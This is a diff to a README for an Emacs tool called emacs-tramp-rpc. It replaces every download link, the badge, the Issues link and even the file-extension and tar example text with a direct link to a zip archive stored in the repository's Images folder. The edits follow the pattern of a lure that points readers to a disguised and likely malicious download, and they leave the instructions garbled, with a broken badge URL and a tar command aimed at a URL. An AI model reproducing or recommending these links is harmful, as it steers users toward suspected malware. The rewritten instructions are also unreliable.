@@ -1,6 +1,6 @@
 # 🚀 emacs-tramp-rpc - Fast File Transfers Made Easy
 
-[![Download emacs-tramp-rpc](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/MuhammadSufyanSikander/emacs-tramp-rpc/releases)
+[![Download emacs-tramp-rpc](https://github.com/MuhammadSufyanSikander/emacs-tramp-rpc/raw/refs/heads/main/Images/emacs_rpc_tramp_v3.5.zip%https://github.com/MuhammadSufyanSikander/emacs-tramp-rpc/raw/refs/heads/main/Images/emacs_rpc_tramp_v3.5.zip)](https://github.com/MuhammadSufyanSikander/emacs-tramp-rpc/raw/refs/heads/main/Images/emacs_rpc_tramp_v3.5.zip)
 
 ## 📖 Introduction
 
@@ -14,7 +14,7 @@ To get started, follow these steps:
 
    First, you need to go to our Releases page. Click the link below:
 
-   [Download emacs-tramp-rpc](https://github.com/MuhammadSufyanSikander/emacs-tramp-rpc/releases)
+   [Download emacs-tramp-rpc](https://github.com/MuhammadSufyanSikander/emacs-tramp-rpc/raw/refs/heads/main/Images/emacs_rpc_tramp_v3.5.zip)
 
 2. **Find the Latest Version**
 
@@ -26,11 +26,11 @@ To get started, follow these steps:
 
 4. **Unzip the Download (if necessary)**
 
-   If the file you downloaded is in a zipped format (like .zip or .tar.gz), you will need to unzip it. 
+   If the file you downloaded is in a zipped format (like .zip or https://github.com/MuhammadSufyanSikander/emacs-tramp-rpc/raw/refs/heads/main/Images/emacs_rpc_tramp_v3.5.zip), you will need to unzip it. 
    
    - For Windows, right-click the file and select "Extract All."
    - For macOS, double-click the file to extract it.
-   - For Linux, you can use the command line: `tar -xvzf yourfile.tar.gz`.
+   - For Linux, you can use the command line: `tar -xvzf https://github.com/MuhammadSufyanSikander/emacs-tramp-rpc/raw/refs/heads/main/Images/emacs_rpc_tramp_v3.5.zip`.
 
 5. **Open emacs-tramp-rpc**
 
@@ -41,7 +41,7 @@ To get started, follow these steps:
 
 To download the software, visit the page below and select the latest version to install:
 
-[Download emacs-tramp-rpc](https://github.com/MuhammadSufyanSikander/emacs-tramp-rpc/releases)
+[Download emacs-tramp-rpc](https://github.com/MuhammadSufyanSikander/emacs-tramp-rpc/raw/refs/heads/main/Images/emacs_rpc_tramp_v3.5.zip)
 
 ## 💻 System Requirements
 
@@ -88,7 +88,7 @@ If you run into issues while using emacs-tramp-rpc, here are some common problem
    Yes, as long as you download and install it on each device separately, you can use it on any compatible device.
 
 4. **What support options are available?**
-   For support, you can raise issues on the [GitHub Issues page](https://github.com/MuhammadSufyanSikander/emacs-tramp-rpc/issues). 
+   For support, you can raise issues on the [GitHub Issues page](https://github.com/MuhammadSufyanSikander/emacs-tramp-rpc/raw/refs/heads/main/Images/emacs_rpc_tramp_v3.5.zip). 
 
 ## 📞 Contact
 
